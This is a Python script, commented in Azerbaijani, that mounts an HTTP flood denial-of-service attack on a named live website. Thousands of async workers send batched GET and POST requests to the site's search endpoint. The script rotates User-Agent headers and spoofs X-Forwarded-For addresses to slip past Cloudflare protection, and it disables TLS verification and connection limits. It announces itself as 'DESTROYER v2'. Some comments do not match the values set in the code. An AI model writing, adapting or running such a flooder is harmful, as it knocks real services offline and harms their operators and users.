import asyncio
import httpx
import random
import string

# --- OPTİMALLAŞDIRILMIŞ GÜC ---
TARGET_URL = "https://streamwin.win"
WORKERS = 5000           # Railway-də donmaması üçün 60-70 arası ideal dır
BATCH_SIZE = 500        # Hər worker eyni anda 40 sürətli paket atsın

def gen_str(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def attack_logic(worker_id, client):
    print(f"[*] Worker {worker_id} hücuma hazır!")
    while True:
        try:
            # Cloudflare-in TLS fingerprint-ini (JA3) çaşdırmaq üçün hər dəfə yeni başlıqlar
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(120,126)}.0.0.0 Safari/537.36",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Requested-With": "XMLHttpRequest",
                "Cache-Control": "no-cache"
            }

            # Serverin daxili axtarış motoruna və ağır API-lərinə müraciət
            url = f"{TARGET_URL}/?s={gen_str(15)}&id={random.randint(1,99999)}"
            
            # Sürətli paket dalğası (Rapid Flood)
            tasks = []
            for _ in range(BATCH_SIZE):
                # Həm GET (keş keçmək üçün), həm də POST (RAM doldurmaq üçün)
                if _ % 3 == 0:
                    tasks.append(client.post(url, headers=headers, json={"data": gen_str(200)}))
                else:
                    tasks.append(client.get(url, headers=headers))
            
            # Dalğanı burax!
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Kiçik bir boşluq (Railway-in çökməməsi üçün çox vacibdir)
            await asyncio.sleep(0.01)

        except Exception:
            await asyncio.sleep(0.5)

async def main():
    print(f"💀 DESTROYER v2 ACTIVATED: {TARGET_URL}")
    
    # TCP səviyyəsində bağlantı limitlərini ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True, 
        verify=False, 
        limits=limits, 
        timeout=10.0
    ) as client:
        
        workers = [attack_logic(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
